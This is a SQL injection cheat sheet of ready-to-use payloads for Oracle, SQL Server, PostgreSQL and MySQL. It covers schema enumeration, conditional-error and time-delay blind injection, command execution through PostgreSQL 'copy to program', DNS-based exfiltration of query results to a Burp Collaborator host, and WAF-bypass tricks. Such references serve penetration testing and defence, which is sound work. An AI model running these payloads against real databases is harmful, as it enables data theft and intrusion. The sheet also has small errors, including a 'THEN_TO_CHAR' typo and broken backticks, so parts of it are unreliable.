## SQL Injection Cheat Sheet

### Comments

> Oracle, Microsoft, PostgreSQL - `--comment`  
> Microsoft, PostgreSQL, MySQL - `/*comment*/`  
> MySQL - `#comment`, `-- comment`

### Database Version

> Oracle - `SELECT banner FROM v$version`, `SELECT version FROM v$instance`, `SELECT * FROM v$version`
> Microsoft, MySQL - `SELECT @@version`  
> PostgreSQL - `SELECT version()`

### Database contents

```
# Oracle
SELECT * FROM all_tables
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE_NAME'

# Microsoft, PostgreSQL, MySQL
SELECT * FROM information_schema.tables
# columns - TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME, TABLE_TYPE

SELECT * FROM information_schema.columns WHERE table_name = 'TABLE_NAME'
# columns - TABLE_CATALOG, TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME, DATA_TYPE
```

### String Concatenation

> Oracle, PostgreSQL - `'foo' || 'bar'`  
> Microsoft - `'foo'+'bar'`  
> MySQL - `'foo' 'bar'`, `CONCAT('foo', 'bar')`

### Substring

> Oracle - `SUBSTR('foobar', 4, 2) Microsoft, PostgreSQL, MySQL - `SUBSTRING('foobar', 4, 2)

### Conditional Errors

```
# Oracle
SELECT CASE WHEN (YOUR_CONDITION_HERE)
    THEN_TO_CHAR(1/0)
    ELSE NULL
    END FROM dual

# Microsoft
SELECT CASE WHEN (YOUR_CONDITION_HERE)
    THEN 1/0
    ELSE NULL END

# PostgreSQL
1 = (SELECT CASE WHEN (YOUR_CONDITION_HERE)
    THEN CAST(1/0 AS INTEGER)
    ELSE NULL END)

# MySQL
SELECT IF (YOUR_CONDITION_HERE,
    (SELECT table_name FROM information_schema.tables), 'a')
```

### Time delays

> Oracle - dbms_pipe.receive_message(('a'), 10)  
> Microsoft - WAITFOR DELAY '0:0:10'  
> PostgreSQL - SELECT pg_sleep(10)  
> MySQL - SELECT SLEEP(10)

### Conditional time delay

```sql
# oracle
SELECT CASE WHEN (CONDITION_HERE)
    THEN 'a' || dbms_pipe.receive_message(('a'), 10)
    ELSE NULL
    END FROM dual

# Microsoft
IF (CONDITION_HERE) WAITFOR DELAY '0:0:10'

# PostgreSQL
SELECT CASE WHEN (CONDITION_HERE)
    THEN pg_sleep(10)
    ELSE pg_sleep(0)
    END

# MySQL
SELECT IF (CONDITION_HERE, SLEEP(10), 'a')

```

### DNS Lookup

- Oracle

```sql
# unpatched
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--

# patched but requires elevated privileges
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

- Microsoft

```
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

- PostgreSQL

```
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

- MySQL (windows only)

```
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

### DNS lookup with data exfiltration

- Oracle

```
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

- Microsoft

```
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

- PostgreSQL

```
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

- MySQL The following technique works on Windows only:

```
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

### WAF bypass

- No whitespace using comments - `'/**/OR/**/1=1/**/--`
- No whitespace using parenthesis - `AND(1)=(1)--`
- No equal using LIKE, (NOT) IN, BETWEEN - `'text' LIKE 'text'`, `'text' IN 'text'`, `'b' BETWEEN 'a' AND 'c'`
- No AND or OR - `&&` and `||`
- No > or < - `NOT BETWEEN a AND b`
- No WHERE - `HAVING`
- No comma
```
LIMIT 0,1 => LIMIT 1 OFFSET 0
SUBSTR('ABC', 1, 1) => SUBSTR('ABC' FROM 1 FOR 1)
SELECT 1, 2, 3 => UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
```
- No information_schema.tables - `SELECT * FROM mysql.innodb_table_stats;`, `SHOW TABLES in db;`


